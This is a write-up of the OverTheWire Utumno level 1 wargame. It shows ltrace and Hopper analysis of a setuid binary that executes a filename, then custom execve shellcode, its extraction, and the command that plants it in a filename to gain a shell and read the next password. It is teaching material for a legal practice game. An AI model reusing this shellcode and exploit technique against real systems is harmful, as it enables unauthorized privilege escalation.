---
layout: post
title: OverTheWire - Utumno1
---

Site: http://overthewire.org/wargames/utumno/ <br>
Level: 1<br>
Situation: Custom Shellcode Exercise<br><br>

We start like we usually do. Create a folder for to work from, file the archtype of the file we are working with then go ahead and run it to see the output.

{% highlight bash %}
utumno1@melinda:~$ mkdir /tmp/uh1
utumno1@melinda:/tmp/uh1$ 
{% endhighlight %}

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ file /utumno/utumno1
/utumno/utumno1: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]
=14165b6969bba9f8c46363c08f6166898f704e3e, not stripped
{% endhighlight %}

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ /utumno/utumno1
utumno1@melinda:/tmp/uh1$ 
{% endhighlight %}

Nothing happens lets go ahead and try to pass a parameter in the arguments line to see if anything happens.

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ /utumno/utumno1 asdf
utumno1@melinda:/tmp/uh1$ 
{% endhighlight %}

Nothing again, time to break out ltrace on both running without a parameter and with one.

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ ltrace /utumno/utumno1
__libc_start_main(0x80484a6, 1, 0xffffd794, 0x8048540 <unfinished ...>
exit(1 <no return ...>
+++ exited (status 1) +++
{% endhighlight %}

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ ltrace /utumno/utumno1 asdf
__libc_start_main(0x80484a6, 2, 0xffffd774, 0x8048540 <unfinished ...>
opendir("asdf")                                             = 0
exit(1 <no return ...>
+++ exited (status 1) +++
{% endhighlight %}

Interesting an opendir is called but as we know it will fail due to our directory not existing. Let’s create the directory and pass it through.

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ mkdir asdf
utumno1@melinda:/tmp/uh1$ 
{% endhighlight %}

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ ltrace /utumno/utumno1 /tmp/uh1/asdf
__libc_start_main(0x80484a6, 2, 0xffffd774, 0x8048540 <unfinished ...>
opendir("/tmp/uh1/asdf")                                    = 0x804a008
readdir(0x804a008)                                          = 0x804a024
strncmp("sh_", "..", 3)                                     = 1
readdir(0x804a008)                                          = 0x804a034
strncmp("sh_", ".", 3)                                      = 1
readdir(0x804a008)                                          = 0
+++ exited (status 0) +++
{% endhighlight %}

We know strncmp is used to compare two strings together and the third parameter is used to specify how many characters to match against. We can also see that "." and ".." are being compared against. In Linux these are used to move directories but they are represented as files on the file system. Since it’s doing it multiple times we can infer that it is iterating over the list of files in asdf. To make sure let’s make a new file called "sh_test" in our directory and see what happens.

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ touch asdf/sh_test
{% endhighlight %}

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ ltrace /utumno/utumno1 /tmp/uh1/asdf
__libc_start_main(0x80484a6, 2, 0xffffd774, 0x8048540 <unfinished ...>
opendir("/tmp/uh1/asdf")                                    = 0x804a008
readdir(0x804a008)                                          = 0x804a024
strncmp("sh_", "..", 3)                                     = 1
readdir(0x804a008)                                          = 0x804a034
strncmp("sh_", "sh_test", 3)                                = 0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
{% endhighlight %}

Interesting here we have crash here. This is about as far as our testing can take us. Time to open up our good old debugger. For this we can use GDB however we will be using hopper to assist us in this.

After loading up in hopper we are going to generate a callgraph to assist us. 

To make things a bit easier when reading the values in memory we will first change our sh_test to sh_testAAAAAAAAAAAAAAAAA.

![Embeded](/images/utumno/utumno1/callgraph1.png)
[FullSize](/images/utumno/utumno1/callgraph1.png)

We can see the standard flow of the application. As we thought there is a looping function that is calling over the directory. To make it easier to read lets go ahead and mark up the callgraph to help understand program flow.

![Embeded](/images/utumno/utumno1/callgraph2.png)
[FullSize](/images/utumno/utumno1/callgraph2.png)

Knowing what occurs we now need to look at the run function and see what is going on. We are going to go ahead and navigate to run and see how it looks.

{% highlight asm %}
run:
    push       ebp
	mov        ebp, esp
	sub        esp, 0x10
	lea        eax, dword [ss:ebp+var_4]
	add        eax, 0x8
	mov        dword [ss:ebp+var_4], eax
	mov        eax, dword [ss:ebp+var_4]
	mov        edx, dword [ss:ebp+arg_0]
	mov        dword [ds:eax], edx
	leave      
	ret        
{% endhighlight %}

We know from our previous callgraph that our filename is stored in EDX. We step through our debugger till right after the return. Then check our values.

![Embeded](/images/utumno/utumno1/hopperdebug1.png)
[FullSize](/images/utumno/utumno1/hopperdebug1.png)

We use x/s $eip to see what our EIP values our.

![Embeded](/images/utumno/utumno1/hopperdebug2.png)
[FullSize](/images/utumno/utumno1/hopperdebug2.png)

Interesting our $eip is in fact our filename. So we know now that our filename location is being passed to EIP and is attempted to be ran and is failing. So now we just have to craft some shell code to exploit this. We have to remember we are limited to the bash environment in what it allows filenames to be. In this case we cannot use our trusty 21 byte /bin/sh as it as "\" when the shell code is generate and bash does not allow this. 

So we have to craft a separate bit of shell code that will call a symlink copy of /bin/sh. Our symlink is simply called "temp" and is generated as follows.

{% highlight bash %}
ln -s /bin/sh temp
{% endhighlight %}

{% highlight asm %}
global _start  		
; Calling execv
; int execve(const char *filename, char *const argv[], char *const envp[]);

section .text
_start:
 
	; Zero out the eax register
	xor eax, eax
        ; Push 0x00000000 to the stack for a null terminated string
	push eax
 
	; Push our desired binary to run
	push 0x706d6574
 
        ; Store position of binary in ebx
	mov ebx, esp
 
        ; Push our null byte and store the address in edx
	push eax
	mov edx, esp 
 
	; push address of binary store in ecx
	push ebx
	mov ecx, esp
  
        ;Move 11 (Execv) to al
	mov al, 11
        ; Call it
	int 0x80

{% endhighlight %}


Now we just upload the file to our folder and compile and link it with the following.

{% highlight bash %}
utumno1@melinda:/tmp/uh1$ nasm -f elf32 shell.asm 
utumno1@melinda:/tmp/uh1$ ld -m elf_i386 -s -o shell shell.o 
{% endhighlight %}

To get the shellcode we need we are going to use a sed online found online.

{% highlight bash %}
objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s \
' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}

Our shellcode is the following.

{% highlight bash %}
\x31\xc0\x50\x68\x74\x65\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
{% endhighlight %}

Now we just need to generate the file we will use Perl and touch for this.

{% highlight bash %}
touch `perl -e 'print "sh_\x31\xc0\x50\x68\
x74\x65\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
{% endhighlight %}

Now we create the file inside of the folder labeled asdf and run our application.

{% highlight bash %}
utumno1@melinda:/tmp/uh1/asdf$ touch `perl -e 'print "sh_\x31\xc0\x50\x68\x74\x65\x6d
\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
utumno1@melinda:/tmp/uh1/asdf$ /utumno/utumno1 `pwd`
$ cat /etc/utumno_pass/utumno2
[OMITTED]
{% endhighlight %}

There is our password.